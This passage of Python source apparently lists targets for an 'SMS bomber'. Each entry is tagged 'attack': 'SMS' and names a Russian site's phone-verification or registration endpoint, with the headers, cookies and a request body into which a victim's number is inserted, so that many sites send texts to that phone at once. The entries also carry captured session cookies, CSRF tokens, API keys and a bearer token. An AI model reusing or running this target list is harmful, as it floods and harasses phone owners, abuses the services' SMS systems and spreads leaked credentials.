name="password"\r\n\r\nTGSGsfsudfyh4e6e5\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="agree_personal"\r\n\r\nY\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf\r\nContent-Disposition: form-data; name="from"\r\n\r\npop\r\n------WebKitFormBoundaryoPwY3U6P9a8v2Bmf--\r\n',
            # Регистрация на номер по смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Podrygka.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.podrygka.ru/ajax/phone_code_validate_form.php',
            'cookies': {'flocktory-uuid': '38f9be36-d30b-4027-bdfc-502669218826-8', '_gcl_au': '1.1.911444722.1679734600', 'rrpvid': '101261192302280', 'rcuid': '641eb7482c7401205029dba8', 'tmr_lvid': 'f14d2e205c20dff18da05a44619cae7a', 'tmr_lvidTS': '1679734600272', '_ym_uid': '1679734601126171430', '_ym_d': '1679734601', '_gid': 'GA1.2.408939463.1679734601', '_ym_visorc': 'b', '_userGUID': '0:lfnqm1h0:JMu0uRAuf7hjQ3hNAmcwqJtwykLdZkAq', 'dSesn': 'e5547efe-cf1f-6e19-ff9a-1484ca2dab47', '_dvs': '0:lfnqm1h0:D9eP_HAQoaaKr7OsAqftxLPTt00XRYbo', 'PHPSESSID': '963fbce8be103d1ddee2cf2b111eac2e', '_ga_PNTGGG08RK': 'GS1.1.1679734601.1.1.1679734603.58.0.0', 'BITRIX_SM_utm_source': 'admitad', 'BITRIX_SM_utm_medium': 'cpa', 'BITRIX_SM_utm_campaign': 'webmasters', 'BITRIX_SM_utm_term': '253174', 'BITRIX_SM_admitad_uid': '19b1e9c64c0fc6ab7987c8f47299eb5f', '_aid': '19b1e9c64c0fc6ab7987c8f47299eb5f', '_ga': 'GA1.2.764149990.1679734601', 'BITRIX_SM_SALE_UID': '1084070042', '_ym_isad': '1', 'tmr_detect': '1%7C1679734604203', 'uxs_uid': '0e5e74b0-caeb-11ed-a432-f7787c6754c6'},
            'headers': {'authority': 'www.podrygka.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.podrygka.ru', 'referer': 'https://www.podrygka.ru/?utm_source=admitad&utm_medium=cpa&utm_campaign=webmasters&webid=253174&admitad_uid=19b1e9c64c0fc6ab7987c8f47299eb5f&utm_term=253174', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'user=9272662&siebel_user=&first_name=&last_name=+&sex=&birth_day=&use_wallet=&place=&date=&redirectURL=%2Fpersonal%2Fprofile%2F&exist=N&recaptcha_token=&from=pop&sessid=42e4142ff3a8074dfd30db16ac32eb94&phone={number}&code=',
            # Повторная отправка смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Auth.Mosmetro.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://auth.mosmetro.ru/api/auth/login/sms',
            'cookies': {'_ym_uid': '16779558764744837', '_ym_d': '1677955876', '_ym_visorc': 'b', '_ym_isad': '1', '.AspNetCore.Culture': 'c%3Dru%7Cuic%3Dru',},
            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://auth.mosmetro.ru', 'Referer': 'https://auth.mosmetro.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Df1dac608-dd35-4717-8cbb-18e2f7a1d522%26redirect_uri%3Dhttps%253A%252F%252Flk.mosmetro.ru%252Fexternal-auth%26response_type%3Dcode%26scope%3Dopenid%2520offline_access%2520nbs.ppa%26code_challenge%3DoBrxEttlJbOU8w-YsggpycdPoqHsRYaZzibVNSk28oM%26code_challenge_method%3DS256%26nonce%3D638135526865213059.ZjMwZTgzMDItMTkwMC00YjVmLTg4YmMtZjUyZTA5NGY5YmY5NzYzMjgyNmQtYjkxOS00MDk0LTllYjQtYjI5ODA4NzYyZmE4%26state%3Ddg9tuqf67aw43y59xz2jec%26ui_locales%3Dru%26acr_values%3Dtheme%253Alight&providers=%5B%0A%20%20%22yandex%22,%0A%20%20%22apple%22,%0A%20%20%22sudir%22,%0A%20%20%22google%22,%0A%20%20%22vkontakte%22,%0A%20%20%22local%22%0A%5D', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'login': number, 'returnUrl': '/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&redirect_uri=https%3A%2F%2Flk.mosmetro.ru%2Fexternal-auth&response_type=code&scope=openid%20offline_access%20nbs.ppa&code_challenge=oBrxEttlJbOU8w-YsggpycdPoqHsRYaZzibVNSk28oM&code_challenge_method=S256&nonce=638135526865213059.ZjMwZTgzMDItMTkwMC00YjVmLTg4YmMtZjUyZTA5NGY5YmY5NzYzMjgyNmQtYjkxOS00MDk0LTllYjQtYjI5ODA4NzYyZmE4&state=dg9tuqf67aw43y59xz2jec&ui_locales=ru&acr_values=theme%3Alight',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Apteka.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.apteka.ru/Auth/Auth_Code',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://apteka.ru', 'Referer': 'https://apteka.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'X-ACTIVE-EXP': 'DAK0V6tfRpexDyCdQdcFLA:0;Sl6pQtLSS6ylDMCDHbsSRg:0;5jyRVuaMTZmKRNZO7qGNFQ:0;qGyqk_-ERkylcC3vjqo19g:0;0z8YSUDbRHKhq2HN6KdDnA:0', 'device-id': '1677955296293_a6f1b4285eeea', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'user-session-id': '1677955296292_50f72dacef46b', 'x-session-id': 'd7e97d0a-2b44-854c-0250-dce2facc32ec',},
            'json': {'phone': f'+{number}', 'u': 'U',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'CityStarwear.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php',
            'cookies': {'PHPSESSID': 'iiKCdeS0Iyq75BsMInq1lI5Il55fw22b', 'I_BITRIX2_SM_bsSiteVersionRun': 'D', 'I_BITRIX2_SM_SALE_UID': '3eb77cb9cce668992fb4b8aecd77f6b9', '_ym_uid': '1677955452713110116', '_ym_d': '1677955452', '_ga': 'GA1.2.1158728733.1677955452', '_gid': 'GA1.2.1002292035.1677955452', '_ym_visorc': 'w', 'tmr_lvid': '5839241cca0b255c8c20c708eee183a2', 'tmr_lvidTS': '1677955452362', '_ym_isad': '1', 'BX_USER_ID': '762dcf2af222904b94c5bdf2f323e544', 'I_BITRIX2_SM_BSPopUpBnr': '%7B%2298263%22%3A1678041855%7D', 'tmr_detect': '1%7C1677955483285',},
            'headers': {'authority': 'citystarwear.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://citystarwear.com', 'referer': 'https://citystarwear.com/lk/profile/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'phone': str(number)[1:], 'hdlr': 'bsSendSMSCode', 'key': 'DOvBhIav34535434v212SEoVINS', 'dataForm[phone]': '9249518462', 'dataForm[callNums]': '', 'dataForm[smsCode]': '', 'dataForm[email]': '', 'dataForm[ecode]': '', '4YreJ': 'niKOC7pJmi1BET3puazqvly5E', 'tTCwJ': 'nLYUqjASgdo3mKNoGxLNOQrIU', 'fiGED': 'gww88r5FPtbfCTLxYknQCt47t', 'dyzOM': 'y10RWRSMhFnc1JrxETX96Fu8C', 'VvYbo': '0Ui38ZF9FWGIpmT55oux1K3AV', '6jOgK': '8LBnrkukNu9tkFSp3HsbkgKS9', 'rOzgC': 'Yx4lA7UOIScs997ucA0zJau8k', 'ocRHN': '7itJktUZCsUekX7IKJC3CkC4B', 'jmzjN': 'm5TqxQurYfN6g5coZLNMf512L', 'eQhnD': 'AhYFKa8XHZsAPtrxclwJbKFSh',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'VseInstrumenti.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://bff.vseinstrumenti.ru/user/pre-auth',
            'headers': {'authority': 'bff.vseinstrumenti.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://m.vseinstrumenti.ru', 'referer': 'https://m.vseinstrumenti.ru/user/login/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'data': {'phone': str(number)[1:], 'type': 'phone', 'g-recaptcha-response': '03AFY_a8Wd0cTxMjFoVPTRQYuu5GmSTEoyIlPTtgFUdS3vom8ahAOq9E1y9LJL5TlpZog9vYXthuVqD9YA5pP7BjfJppFDxeEaSawyYFxDDr744u0_S50kGUigS4tXkW_YP_ffJaoEdfwuPyoz52QMNEazXeSIL5De9dxp8umvNHTarJNOA5uWIQnT-Q94c2pQdB2S1ft0dVhBk5aG4wdiAQbWd1hdvCwzowAtj2XKrBi_xN0FQLFjxMHTJf0l1i7pUUU-Of-B-mrT8ELdtikfgUx-ELzxugsORVHIzRKTeSege58-YPOm3HuZSyltTDdAuMspHpyQJa0HhfHGXjm0QaQ3qfn8SHHcdz1RzxSOQZou2USWHj_AqioGiGQbnA_zVWYGWE0nKKZG80VWIzGDt0n6FoZLmPpmLp5js3QfD3o1_7EGMk5akdJ6Z0OjyckF8YmMuJ9a9uN1bk0L3sVBGbWDjLPuZ6woOTss-ssJiKCiH6WQGTuRQbxJNvkMPsiyCGbrc6zLnE_DwPalMHgeN8t1Rzfc8QreXOoWNo1ZXnKUv85snasGBmvPWxxXAAsTngkfgN4cOrDE',},},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'JustFood.pro', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://crm.justfood.pro/api/apps/mobile/password',
            'headers': {'authority': 'crm.justfood.pro', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'appkey': '76DE91A0-C039-4CE8-95FE-9A9D05E90521', 'authorization': '', 'content-type': 'application/json; charset=UTF-8', 'cookie': '_jft_uid=04dd1225-1622-4288-935d-9af55755087d; _ym_uid=1673545482514172816; _ym_d=1677664472; _ym_isad=1; tmr_lvid=18ecccc1565cb22b6d5d9c82d60c20e0; tmr_lvidTS=1673545482306; _ym_visorc=w; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D1%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fwww.justfood.pro%252F; mgo_uid=h4XEIJ5hxclEGqjf73SW; mgo_cnt=1; mgo_sid=yry8rqu66x11001ajx5r; _ga=GA1.2.851532076.1677664473; _gid=GA1.2.609840649.1677664473; _dc_gtm_UA-93162701-1=1; t=91; SubscriptionChoice=%7B%22menuType%22%3A%22Fit%22%2C%22mode%22%3A%22Full%22%2C%22size%22%3A1200%2C%22days%22%3A5%2C%22autoRenewal%22%3Afalse%2C%22familySubscriptionRequest%22%3Afalse%2C%22promocode%22%3A%22%22%7D; advcake_track_id=f9023d2c-ba74-067f-ee61-036f50628c56; advcake_session_id=5cd773a5-6708-056d-5981-8009ab75b7ff; _ga_PE0LJ6KWRT=GS1.1.1677664472.1.0.1677664475.0.0.0; justfood.pro_UTM=', 'origin': 'https://www.justfood.pro', 'referer': 'https://www.justfood.pro/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'iPizza.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ipizza.ru/gql',
            'headers': {'authority': 'ipizza.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'cookie': '_geo=msk; _ym_uid=16729469621072084411; _ym_d=1677668507; _ym_isad=1; adspire_uid=AS.1437338016.1677668506; _ym_visorc=w; __exponea_etc__=07947508-b82d-4e07-9433-ab3be0543fe0; __exponea_time2__=0.32030701637268066; _ga=GA1.2.2073522979.1677668507; _gid=GA1.2.1053252998.1677668507; _gaclientid=2073522979.1677668507; _gasessionid=20230301|02978988; _dc_gtm_UA-47410169-1=1; _gahitid=16:02:01', 'origin': 'https://ipizza.ru', 'referer': 'https://ipizza.ru/msk/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'query': 'mutation sendPhone($domain:ID!,$phone:String!,$recaptcha:String){phone(number:$phone,region:$domain,recaptcha:$recaptcha){token error{code message}}}', 'variables': {'domain': 'msk', 'phone': number,},},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Vkusnoitochka.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://site-api.vkusnoitochka.ru/api/v1/user/login/phone',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://vkusnoitochka.ru', 'Referer': 'https://vkusnoitochka.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'x-device-id': 'site-8bcf46dbed79e361a89a135e1d567ea0', 'x-language': 'ru', 'x-platform': 'site', 'x-timezone': 'GMT+05:00',},
            'json': {'number': f'+{number}', 'g-recaptcha-response': '03AFY_a8W9USknoUmUbtX0KW3Ng5BKGl9ldVaNJUpxS9UR1QfiutmkZFHhQVkakRVr0wGVM7R3tPmRILtKXtQStsUDQH79JbmdLqI-APyTSvAxaJWZVzhPbOU-q2WwHBmnacHeWqXBJgGv0JCPWkT1mi9lnLAtCSQ1NKrSBY1qxEIakK44l32v7iQvolZIqAfpL8xaIBV_9b5T95DFH1XZUnQpG16OJlNql3TI5BT3Y8fHQ8nnc006pcRiB1cmWja17FfvDoGO-zQbdBDGsoGP3xcvcvgi-r8LrC3pdCmk156qSEzMvaSi9VI0j1EclElYXNmYRhNz-YcfD4EhvaQBfSSonwniL0WeFF3M8JUYu5TRSSlM8S5ydzFraYKp4oujrAaUTwVIujofyZaW5DJxXz_WhXVgSB6t_qweTf0YW5w9DB-7jl4HJQA1Pln26enY8xBywtwNlbPO2-WKMPMgNNGIe83jcYNdhxyIt37IyFJPo8UtZHmVyJv5mDMupyyhl7QYqCbdanH1QTDuO8_lBcrhvnTmga5gKQ',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'LocalKitchen.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.localkitchen.ru/v3/web/app_links',
            'headers': {'authority': 'api.localkitchen.ru', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'cookie': '_ym_uid=1677665485240864091; _ym_d=1677665485; _ym_isad=1; _ga=GA1.2.18932455.1677665485; _gid=GA1.2.1918771133.1677665485; _dc_gtm_UA-148811026-1=1; _gcl_au=1.1.33192340.1677665485; _ym_visorc=w; _kitchen_session=SWxnY3RBbHFJa0dHTVpIQll6UlAxNTRHcVFYRGp3ZDBSM3ZzQkxFMkZUYlFQMlRtb3V2SlBoTm9sOEU1YmFPQVh2MkFiUngvYnlqbjk5NTdJbWlrOWo4c3lnSWt4UnRLUUFLTE44a2VYbkIzSWk4Nnp3SEc5NDlqNTZsaXo0NUt1aWhKcWFPeXZMSmRtYzNWSUVqWGNRPT0tLWlxSndEUEdrMWh6YjhXWXArakJEYnc9PQ%3D%3D--ad8f831d0bbd49b36642a9a7cb0328749590d9d5', 'origin': 'https://localkitchen.ru', 'referer': 'https://localkitchen.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], 'x-csrf-token': 'wpUnv5lZWGk5tbV1Y6MOikTHCeT7sRumkYpYEQv19YpKTQDfdYr1nDqxzpHApRK3MG/RGzwAW43LD5uGZERxQg==',},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Elementaree.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api-new.elementaree.ru/graphql',
            'headers': {'authority': 'api-new.elementaree.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': 'Bearer _08yuzSWWPkZHRS2U71ysiE-DNKKTeCL', 'content-type': 'application/json', 'origin': 'https://elementaree.ru', 'referer': 'https://elementaree.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'operationName': 'pushLead', 'variables': {'site_version': 2, 'email': None, 'phone': number, 'name': '', 'source': {'survey': '', 'type': 16,}, 'utm': {}, 'location': 'popup', 'ga_client_id': '1090519426.1677611429', 'subscription': {'dishes': [], 'promocode': '', 'price': {'total': 0,}, 'payment': 'online', 'profile': {'referrer_code': 'undefined',}, 'categories': [],}, 'platform': 'web',}, 'query': 'mutation pushLead($date: String, $email: String, $phone: String, $name: String, $form_name: String, $source: leadSource, $location: String, $utm: leadUtm, $ga_client_id: String, $admitad_uid: String, $subscription: leadSubscription, $roistat_visit: String, $request_questions: String, $partner_id: String, $site_version: Int, $platform: platform) {\n  pushLead(\n    date: $date\n    email: $email\n    phone: $phone\n    name: $name\n    form_name: $form_name\n    source: $source\n    location: $location\n    utm: $utm\n    ga_client_id: $ga_client_id\n    admitad_uid: $admitad_uid\n    subscription: $subscription\n    roistat_visit: $roistat_visit\n    request_questions: $request_questions\n    partner_id: $partner_id\n    site_version: $site_version\n    platform: $platform\n  ) {\n    success\n    isNewbie\n    isFirstLead\n    id\n    __typename\n  }\n}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'YesFrukt.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://yesfrukt.com/profile/register',
            'headers': {'authority': 'yesfrukt.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://yesfrukt.com', 'referer': 'https://yesfrukt.com/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-csrf-token': 'xeWaWKTHojZPJ_cGASODky4XiG_bwV3FpXwp9sLshlH9kO8t6pb4YT8SvHZgDrLwS0HZWLSWJa3kBR-ghYPKGQ==', 'x-requested-with': 'XMLHttpRequest',},
            'data': f'_frontend=xeWaWKTHojZPJ_cGASODky4XiG_bwV3FpXwp9sLshlH9kO8t6pb4YT8SvHZgDrLwS0HZWLSWJa3kBR-ghYPKGQ%3D%3D&CustomerModel%5Bemail%5D={email()}&CustomerModel%5Busername%5D=%2B{number}&phoneCode=7&CustomerModel%5Bpassword%5D=Adsahdaskd5465dsa6s&CustomerModel%5BrememberMe%5D=0&CustomerModel%5BrememberMe%5D=1',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Klerk.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.klerk.ru/yindex.php/v4/security/send-sms',
            'headers': {'authority': 'www.klerk.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.klerk.ru', 'referer': 'https://www.klerk.ru/auth/?phone', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'phone': number, 'forPhoneConfirmation': True,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'lk.MegaFon.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lk.megafon.ru/api/auth/otp/request',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://lk.megafon.ru', 'Referer': 'https://lk.megafon.ru/login', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Cabinet-Capabilities': 'web-2020', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'login': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Hoff.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://hoff.ru/vue/register/',
            'headers': {'authority': 'hoff.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://hoff.ru', 'referer': 'https://hoff.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Raiffeisen.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://www.raiffeisen.ru', 'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'number': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Yarus.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.yarus.ru/reg',
            'headers': {'authority': 'api.yarus.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://yarus.ru', 'referer': 'https://yarus.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1], 'x-api-key': 'PELQTQN2mWfml8XVYsJwaB9Qi4t8XE', 'x-app': '3', 'x-device-id': '45732843-79e2-4cf4-b963-f060ea796458',},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TV.Yota.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://bmp.tv.yota.ru/api/v10/auth/register/msisdn',
            'cookies': {'_gid': 'GA1.2.1137395043.1677843015', 'YOTA_SITE_VISITED': 'true', 'INITIAL_REFERER': 'yandex.uz', 'YOTA_REGION_CODE': 'O_18', '_ym_uid': '1677862818427173366', '_ym_d': '1677862818', '_ym_visorc': 'b', 'tmr_lvid': 'ee03adb9b1dce9737a06cfb1b6e91bba', 'tmr_lvidTS': '1677862818170', '_ym_isad': '1', 'SessionID': 'K59bRHjb2ZOPSceSpB2MmMRKsNySdk4entBHPUagVUM', '_dc_gtm_UA-16019436-35': '1', '_dc_gtm_UA-16019436-1': '1', '_ga_94TC7EBHF1': 'GS1.1.1677862863.2.0.1677862863.60.0.0', '_ga': 'GA1.2.96033787.1677843015',},
            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://tv.yota.ru', 'Referer': 'https://tv.yota.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'msisdn': number, 'password': '8784281215',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sunlight.net', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.sunlight.net/v3/customers/authorization/',
